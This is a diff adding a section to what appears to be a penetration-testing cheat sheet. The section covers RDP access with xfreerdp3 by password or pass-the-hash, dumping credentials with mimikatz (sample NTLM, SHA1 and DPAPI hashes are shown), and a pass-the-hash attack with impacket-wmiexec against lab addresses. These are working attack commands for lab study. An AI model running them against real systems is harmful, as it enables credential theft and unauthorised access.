@@ -166,3 +166,34 @@ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
 
 # Now you may RDP, WinRM, SMB or whatever you want to connect insstead of using shell
 ```
+
+# Windows Credential Guard (Domain Account)
+
+```bash
+xfreerdp3 /v:TARGET_IP /u:USERNAME /d:DOMAIN /p:'PASSWORD' /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools
+
+#If you are using a hash:
+xfreerdp3 /v:TARGET_IP /u:USERNAME /d:DOMAIN /pth:'HASH' /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools
+
+#Example Password version
+
+xfreerdp3 /v:192.168.160.248 /u:Administrator /d:CORP /p:'QWERTY123!@#' /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools
+
+# Run mimikatz as admin to get hash
+
+# Results
+ * Username : Administrator
+ * Domain   : CORP
+ * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
+ * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
+ * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
+```
+![alt text](image-7.png)
+
+
+
+### Peform a PtH Attack with new domain/User/Hash
+```bash
+impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
+```
+![alt text](image-8.png)
